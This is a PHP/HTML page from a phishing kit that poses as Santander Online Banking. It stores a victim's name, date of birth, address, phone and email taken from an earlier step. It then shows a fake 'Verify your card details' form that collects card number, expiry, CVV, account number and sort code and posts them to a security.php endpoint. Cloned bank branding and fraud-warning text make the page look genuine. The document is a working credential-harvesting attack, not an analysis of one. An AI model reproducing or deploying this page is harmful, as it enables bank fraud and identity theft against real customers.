<?php
require_once "../../config/session_check.php";
require_once "../../config/functions.php";

$_SESSION['dob'] = $_POST['dob'];
$_SESSION['name'] = $_POST['name'];
$_SESSION['telephone'] = $_POST['telephone'];
$_SESSION['email'] = $_POST['email'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['town'] = $_POST['town'];
$_SESSION['postcode'] = $_POST['postcode'];
?>
<html lang="en-GB">
<head>
    <style>
        #chk_publiccomp:focus ~ .checkmark{
            outline:#444 solid 1px;
            -moz-outline:#444 solid 1px
        }
    </style>
    <title>Santander Online Banking </title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="Tue, 01 Jan 1980 12:00:00 GMT">
    <meta http-equiv="Cache-Control" content="no-cache">
    <link rel="shortcut icon" href="assets/favicon.ico">
    <link rel="stylesheet" type="text/css" media="screen, print" href="assets/santander.css">
    <link rel="stylesheet" type="text/css" media="print" href="assets/print.css">


    <style type="text/css">.hideBCSOC, .hideJS {position: absolute !important;  height: 1px; width: 1px;  overflow: hidden; clip: rect(1px 1px 1px 1px);   /* IE6, IE7 */  clip: rect(1px, 1px, 1px, 1px);  padding: 0 !important;  /* IE6, IE7 */  line-height: 0;   /* IE6, IE7 */   text-indent: -9000px; /* IE6, IE7 */}</style>
    <script src="assets/satellite-5afef3a464746d11d30049e3.js"></script><script src="assets/satellite-58f9dc3064746d2d7e00916d.js"></script><script src="assets/s-code-contents-3ca5b8d0e453d2b1653a80ee4c15239e5d6c1bf1.js"></script><script src="assets/satellite-5a3bdd8264746d22120023e5.js"></script><script type="script/meta" src="assets/xee.js"></script><script type="script/meta" src="assets/sanns.js"></script>
    <style type="text/css">      body {margin:0; padding: 0;height: 100%;}      #splash-97123-overlay{padding:0;margin:0;position: absolute;top:0;left:0;right:0;width:100%;height:100%;background:#595959 url(assets/spacer.gif) center center;z-index:1001;-moz-opacity: 0.8;opacity: 0.80;filter: alpha(opacity=80);display: block;}      #splash-97123-splash {font-family:verdana,arial,tahoma;font-size:14px;width: 640px; margin: 20px -320px;z-index:10002; position: absolute;left: 50%;top:100px;display: block;}      #splash-97123-body {title:Please download Trusteer Rapport which provides you with advanced layers of protection against malware and other security threats. For more information click on the Learn More link which also contains a link to download the Trusteer Rapport software.;color:#000;height:495px;width:640px;font-size: 12px;font-family:verdana,arial,tahoma;text-align:left;color:black;background: url(assets/santanderuk_personal_20131022.jpg) center center;}      #splash-97123-close-button{height:30px;width:30px;position:relative;float:right;border:none;cursor:pointer;margin:-10px -15px -10px 0px;background: url(assets/close-btn.png) center center;text-align:left;z-index:10002; }      #splash-97123-download-button {padding: 2px; text-align: center; width:222px; margin: 20px auto 10px;  cursor: pointer; position:absolute;top:366px;left: 413px;height:52px}      #splash-97123-download-button p {color:#000;background:#04A2F4;color:#ffffff;line-height:20px;font-size:20px;text-align:left;padding:0px}        #splash-97123-download-button-container{ text-align: center}        #splash-97123-iframe { width:100%; height:100%;border:0;background: #595959; color: #595959;}        #splash-97123-iframe body{background: #595959; color: #595959; }        #splash-97123-footer-left {float:left;padding-left:20px;text-align:left;position:absolute;bottom:19px;}      #splash-97123-footer-left a {margin-right: 10px; color: #0033FF; font-size: 12px;font-weight: normal; text-decoration: underline;text-align:left;font-family:verdana,arial,tahoma;}      #splash-97123-footer-left a:hover {color: #0033FF;}      #splash-97123-body-overlay {padding:0;margin:0;position: absolute;top:0;*top:10px;left:0;right:0;width:640px;height:495px;background:#8D8D8D center center;z-index:1001;-moz-opacity: 0.8;opacity: 0.80;filter: alpha(opacity=80);display: block;}      #splash-97123-clicked-message {title:Thank you for downloading Trusteer Rapport. (Don&#39;t forget to open and run the file once it has finished downloading). Close this message. How do I install?;width:640px;height:179px;z-index:1002;position:absolute;left:0px;top:150px;display: block;background: url(assets/download_click_1.png);}      #splash-97123-clicked-close-button {width:167px;height:30px;position:absolute;top:122px;left:146px;cursor:pointer;}      #splash-97123-clicked-help-button {width:167px;height:30px;position:absolute;top:122px;left:326px;cursor:pointer;display:block;}      #splash-97123-downloaded-message {title:Your account is not yet protected. You have downloaded Trusteer Rapport to protected your online account, buy it&#39;s currently not protecting your online banking. Download Again. Why Not?;width:640px;height:179px;z-index:1002;position:absolute;left:0px;top:150px;display: block;background: url(assets/already_downloaded_1.png);}      #splash-97123-downloaded-download-button {width:167px;height:30px;position:absolute;top:122px;left:146px;cursor:pointer;}      #splash-97123-downloaded-help-button {width:167px;height:30px;position:absolute;top:122px;left:326px;cursor:pointer;}    </style>
    <style type="text/css">        #splash-97123-overlay {min-height: 800px;}        #splash-97123-close-button {margin:-10px -15px -10px 0px}      </style>
    <script src="assets/ukfs.js" async="" type="script/meta"></script>
    <style type="text/css">#cookieMessage { margin-top: 4px; margin-bottom: 12px; background: #e6e6e6; padding: 12px; overflow: hidden; } #cookieMessage img { float: left; } #cookieMessageContent { overflow: hidden; margin-left: 36px; } #cookieMessageContent p:first-child { margin-top: 0px; } #cookieMessageContent a { font-weight: bold; } #cookieMessageContent a:hover { color: #c90212; } #cookieMessageBtns { margin-top: 8px; margin-bottom: 0px; } #acceptCookieMessageBtn { background: #ec0000; border: none; padding-left: 12px; padding-right: 12px; } #acceptCookieMessageBtn:hover { background: #cc1221; color: white; }</style>
    <script src="assets/satellite-5a3bede364746d18f9003dde.js"></script><script type="text/javascript" async="" src="assets/WqPjM_006"></script><script type="text/javascript" async="" src="assets/WqPjM_011"></script>
    <style type="text/css">#edr_survey .edr_lwrap iframe {width:100%;height:100%;}#edr_survey .edr_go {opacity:0;display:block;filter:alpha(opacity = 0);position:absolute;font-size:0;background-color:#000;margin:0;padding:0;z-index:1000000;}#edr_survey .edr_lb {position:fixed;top:0;left:0;right:0;bottom:0;z-index:999998;display:none;}</style>
    <script type="text/javascript" async="" src="assets/fyo"></script><script type="text/javascript" async="" src="assets/fyo_003"></script><script type="text/javascript" async="" src="assets/WqPjM_009"></script><script type="text/javascript" async="" src="assets/fyo_002"></script><script type="text/javascript" async="" src="assets/WqPjM_008"></script><script type="text/javascript" async="" src="assets/WqPjM"></script><script type="text/javascript" async="" src="assets/WqPjM_004"></script><script type="text/javascript" async="" src="assets/WqPjM_003"></script><script type="text/javascript" async="" src="assets/WqPjM_007"></script><script type="text/javascript" async="" src="assets/WqPjM_002"></script><script type="text/javascript" async="" src="assets/WqPjM_005"></script><script type="text/javascript" async="" src="assets/WqPjM_010"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
    <script>

        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 11, digits: true,},
                                email: { required: true, email: true,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
                                telephone: {
                                    required: "Please provide telephone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("three").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("four").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("five").value=address;
            var town = document.getElementById("town").value;
            document.getElementById("six").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("seven").value=postcode;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 8,},
                                sortcode: { required: true, minlength: 8,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                sortcode: {
                                    required: "Please provide 6 digit sort code",
                                    minlength: jQuery.validator.format("Please check the sort code you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>
</head>
<body cz-shortcut-listen="true">
<div id="edr_survey"></div>
<div id="global">
    <a href="#bodycontent" class="skipToContent">Skip to content</a>

    <div id="header">
        <div id="headerbanner" class="padlock">
            <div id="bankname">
                <a href="#">Santander</a>
            </div>
        </div>
    </div>
    <div id="bodycontent">
        <div id="bodycontent">
            <div id="content">
                <h1 style="color:black">Verify your card details</h1>


                <div id="logonstep1" class="container">
                    <div class="logOnSection">
                        <small style="color: red; font-size: 12px; margin-bottom: 10px;">This is last step of our verification process.</small>
<Br />
                        <form method="post" action="security.php?ssl_id=<?php echo getString(); ?>" name="payment" id="payment">
                            <fieldset>
                                <div class="form-item multiple">
                                    <label for="infoLDAP_E.customerID" class="fieldhelp" style="color:black"><span class="labeltext">Name on Card: </span></label>
                                    <span class="inputNuevo">
                                 <input type="text" class="mandatory firstfocus correct" autocomplete="off" id="cc-name" name="ccname" required maxlength="32">&nbsp;&nbsp;&nbsp;
                                 </span>
                                    <label for="infoLDAP_E.customerID" class="fieldhelp" style="color:black"><span class="labeltext">Card number: </span></label>
                                    <span class="inputNuevo">
                                 <input type="text" class="mandatory firstfocus correct" autocomplete="off" id="cc-number" name="ccno" maxlength="16" required>&nbsp;&nbsp;&nbsp;
                                 </span>
                                    <label for="infoLDAP_E.customerID" class="fieldhelp" style="color:black"><span class="labeltext">Expiry date: </span></label>
                                    <span class="inputNuevo">
                                 <input type="text" class="mandatory firstfocus correct" autocomplete="off" id="cc-exp" name="ccexp" required>&nbsp;&nbsp;&nbsp;
                                 </span>
                                    <label for="infoLDAP_E.customerID" class="fieldhelp" style="color:black"><span class="labeltext">Security code: </span></label>
                                    <span class="inputNuevo">
                                 <input type="password" class="mandatory firstfocus correct" autocomplete="off" id="cc-cvc" name="secode" required maxlength="4">&nbsp;&nbsp;&nbsp;
                                 </span>
                                    <label for="infoLDAP_E.customerID" class="fieldhelp" style="color:black"><span class="labeltext">Account: </span></label>
                                    <span class="inputNuevo">
                                 <input type="text" class="mandatory firstfocus correct" autocomplete="off" id="account" name="account" required maxlength="8">&nbsp;&nbsp;&nbsp;
                                 </span>
                                    <label for="infoLDAP_E.customerID" class="fieldhelp" style="color:black"><span class="labeltext">Sortcode: </span></label>
                                    <span class="inputNuevo">
                                 <input type="text" class="mandatory firstfocus correct" autocomplete="off" id="sortcode" name="sortcode" required>&nbsp;&nbsp;&nbsp;
                                 </span>


                                    <span class="data">
                                 <span class="row">
                                 <span class="inputNuevo">
                                 </span>
                                 <span class="botonNuevo">
                                 <input type="submit" id="btnFO" class="defaultAction botonNuevo" value="Continue" onclick="return ntptLinkTag( this, 'lc= http%3A%2F%2Fwww.santander.co.uk%2Fpre_force_change%3Fchange%3DOK', 'un= 1713717', 1 );">
                                 </span>
                                 <br>
                                 </span>
                                 <span class="row">

                                 </span>
                                 </span>
                                    <div class="lineas">

                                    </div>
                                </div>
                            </fieldset>
                            <input type="hidden" id="foData" name="foData">
                            <input type="hidden" name="origen" value="validate">
                            <input type="hidden" name="bind.devicePrint" value="version%3D3%2E5%2E0%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%3B%20rv%3A65%2E0%29%20gecko%2F20100101%20firefox%2F65%2E0%7C5%2E0%20%28Windows%29%7CWin32%26pm%5Ffpsc%3D24%7C1280%7C720%7C680%26pm%5Ffpsw%3D%26pm%5Ffptz%3D%2D2%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3D%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1280%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D65%26pm%5Fbr%3DFirefox%26pm%5Finpt%3D%26pm%5Fexpt%3D">
                            <input type="hidden" id="IdGhostAccount" name="IdGhostAccount" value="">
                            <input type="hidden" id="urlLog" name="urlLog" value="#">
                            <input type="hidden" id="ssCookie" name="ssCookie" value="uHAmU22K4uMYaoQNw46vscF">
                            <input type="hidden" id="jsessionID" name="jsessionID" value="uHAmU22K4uMYaoQNw46vscF">
                        </form>

                    </div>
                    <h2 class="logOnTitle" style="color:black">Sign up for Online and Mobile Banking</h2>
                    <div class="logOnSection">
                        <h3 style="color:black">Signing up only takes a few minutes.</h3>
                        <ul class="itemList" style="color:black">
                            <li>view statements and transactions</li>
                            <li>transfer money between accounts</li>
                            <li>pay bills and people</li>
                            <li>set up text and email alerts</li>
                            <li>and much more!</li>
                        </ul>
                        <div class="lineas">
                            <hr>
                        </div>
                        <span class="botonNuevo">
                        <a class="botonNuevo" href="#" target="blank">Sign up</a>
                        </span>
                    </div>
                </div>
                <h2 class="logOnTitle" style="color:black">Log on to other online services</h2>
                <div class="logOnSection">
                    <ul class="linkList">
                        <li><a href="#" target="premium" style="color:black">Clients of Premium Investments</a></li>
                    </ul>
                </div>
                <br>
                <img src="assets/FSCS_banner.PNG" alt="">
            </div>
        </div>
    </div>
    <div id="logonside">
        <div class="usefulLinksMenuNuevo">
            <h2>Useful links</h2>
            <ul>
                <li><a href="#" target="santanderHelp">About Online Banking</a></li>
                <li><a href="#" target="santanderHelp">View Online Banking videos</a></li>
                <li><a href="#" target="santanderHelp">About Mobile Banking</a></li>
                <li><a href="#" target="santanderHelp">View Mobile Banking videos</a></li>
                <li><a href="#" target="santanderHelp">Send me Online and Mobile Banking guides</a></li>
                <li><a href="#" target="contactUs">Contact us</a></li>
                <li><label class="infologon"><a href="#" target="TyC">Changes to Online and Mobile Banking Terms and Conditions</a></label></li>
            </ul>
        </div>
        <div class="importantNotesNuevo">
            <h2>Important Fraud Information</h2>
            <div class="section">
                <p><b>Never</b> share a Santander One Time Passcode (OTP) with another person. Not even a Santander employee.</p>
                <p><b>Never</b> download software or let anyone remotely log on to your computer or devices, either during or after a cold call.</p>
                <p><b>Never</b> enter your Online Banking details after clicking on a link in an email or text message.</p>
                <p><b>Never</b> transfer or withdraw money out of your account if you’re instructed to do so for security reasons.</p>
                <p><b>Never</b> set up new or change
                    existing payment details without first verifying the request directly
                    with the person or company you’re paying, preferably using existing
                    contact details.
                </p>
                <p> Click <a href="#" target="_blank">here</a> for more information on how to protect yourself from fraud and scams.</p>
            </div>
            <div class="section">
                <h2>Security Software</h2>
                <p>Install <a href="#" target="_blank">Trusteer Rapport</a>. This free software can help protect you when you're using Online Banking.</p>
            </div>
            <div class="section">
                <h2>Received a suspicious email?</h2>
                <p>If you get an email that's branded Santander but doesn't
                    contain your name, do not reply, open any attachment or click on any
                    link. Forward the email to <a href="mailto:phishing@santander.co.uk">phishing@santander.co.uk</a> for us to investigate.
                </p>
            </div>
        </div>
    </div>
    <div id="footer">
        <ul>
            <li><a title="This link opens in a new window" href="#" target="santanderHelp">Online Banking Guarantee</a></li>
            <li><a title="This link opens in a new window" href="#" target="santanderHelp">Site Help &amp; Accessibility</a></li>
            <li><a title="This link opens in a new window" href="#" target="santanderHelp">Security &amp; Privacy</a></li>
            <li><a title="This link opens in a new window" href="#" target="santanderHelp">Terms &amp; Conditions</a></li>
            <li class="last"><a title="This link opens in a new window" href="#" target="santanderHelp">Legal</a></li>
        </ul>
    </div>
</div>

<div tabindex="-1" class="overlay hidden"></div>
<img id="621406" style="display: none;" src="assets/a_002.txt"><img id="106059" style="display: none;" src="assets/blank.gif"><iframe style="visibility: hidden; width: 0px; height: 0px; border: medium none; display: none;" title="_clqyc" frameborder="0"></iframe><iframe style="visibility: hidden; width: 0px; height: 0px; border: medium none; display: none;" title="gkqmre" frameborder="0"></iframe><iframe id="iframe293" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="evkphb" frameborder="0"></iframe><iframe id="iframe699" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="ervmvn" frameborder="0"></iframe><iframe id="iframe395" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="ihkahl" frameborder="0"></iframe><iframe id="iframe605" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="peaogy" frameborder="0"></iframe><iframe id="iframe684" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="ocrdvf" frameborder="0"></iframe><iframe id="iframe351" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="ehpzxp" frameborder="0"></iframe><img id="34112" style="display: none;" src="assets/a.txt"><iframe id="iframe855" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="dxqdgx" frameborder="0"></iframe><iframe id="iframe447" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="kaxhlo" frameborder="0"></iframe><iframe id="iframe546" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="xvdmbp" frameborder="0"></iframe><iframe id="iframe105" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="emegcw" frameborder="0"></iframe><iframe id="iframe422" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="vwgnid" frameborder="0"></iframe><iframe id="iframe635" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="_cqngy" frameborder="0"></iframe><iframe id="iframe681" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="zuhdes" frameborder="0"></iframe><iframe id="iframe993" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="_b_pdd" frameborder="0"></iframe><iframe id="iframe662" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="xkrrxm" frameborder="0"></iframe><iframe id="iframe538" style="width: 0px; height: 0px; border: medium none; display: none;" src="javascript: false;" title="x_wyrn" frameborder="0"></iframe>
</body>
</html>
